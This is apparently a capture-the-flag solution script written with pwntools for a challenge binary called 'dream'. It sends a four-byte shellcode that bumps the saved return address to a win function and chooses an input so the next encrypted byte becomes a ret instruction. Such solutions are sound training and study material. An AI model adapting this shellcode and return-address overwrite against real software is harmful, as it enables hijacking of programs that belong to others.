from pwn import *
# fill in binary name
elf = context.binary = ELF("./dream")

if args.REMOTE:
  # fill in remote address
  p = remote("numbersss.chal.cyberjousting.com", 1351)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = elf.process()
  gdb.attach(p)
else:
  p = elf.process()

'''
Idea:
- When our shellcode is called using "call rax", the RIP is pushed onto the stack.
- We can input the first 4 bytes unencrypted because of the *((int*)ccol) = origin line
- From k = 16 to k = 99, every byte of the payload we give goes through their rotation encryption function due to *(ccol + k) = custom_random();
- We set the first 4 bytes to be add byte ptr [rsp], 3 to change our saved rip to the address of the win function
- Then our first encrypted byte will be a return instruction (which is only one byte).
- We can easily bruteforce the STATE value we should input such that our byte becomes the ret instruction.
'''

p.recvline()
p.sendline(b'108') # set state to be 0xc3 (ret) after the encryption
payload2 = b"\x80\x04\x24\x03" # add byte ptr [rsp], 3
payload2 = int.from_bytes(payload2, "little")
payload2 = str(payload2).encode()
print(payload2)
p.sendlineafter(b"thinking about?", payload2)  
p.interactive()
